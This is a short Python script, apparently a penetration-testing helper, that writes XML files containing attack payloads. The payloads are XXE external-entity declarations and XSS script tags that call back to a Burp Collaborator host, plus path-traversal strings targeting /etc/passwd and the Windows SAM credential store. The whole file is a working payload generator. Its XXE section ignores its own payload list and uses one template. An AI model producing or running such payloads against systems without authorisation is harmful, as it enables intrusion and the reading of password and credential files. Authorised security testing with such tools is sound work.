from pathlib import Path

def generate_xml_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
            f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
            f'<!ENTITY % xxe SYSTEM "http://{burp_collab}/xxe4">',
            f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe5">]>',
        ],
        'xss': [
            f"<script>fetch('http://{burp_collab}/xss1')</script>",
            f"<data><![CDATA[<script>fetch('http://{burp_collab}/xss2')</script>]]></data>",
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
    }
    
    for vuln, payloads in vulns.items():
        vuln_dir = output_dir / vuln
        vuln_dir.mkdir(exist_ok=True)
        
        if vuln == 'xxe':
            xml_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{}/xxe{}">
]>
<root>
<data>&xxe;</data>
</root>'''
            for i in range(1, len(payloads) + 1):
                xml_content = xml_template.format(burp_collab, i)
                output_file = vuln_dir / f"payload_{i}.xml"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xml_content)
        
        elif vuln == 'xss':
            for i, payload in enumerate(payloads, 1):
                xml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
{payload}
</root>'''
                output_file = vuln_dir / f"payload_{i}.xml"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xml_content)
        
        elif vuln == 'path_traversal':
            for i, payload in enumerate(payloads, 1):
                xml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<file>{payload}</file>
</root>'''
                output_file = vuln_dir / f"payload_{i}.xml"
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(xml_content)

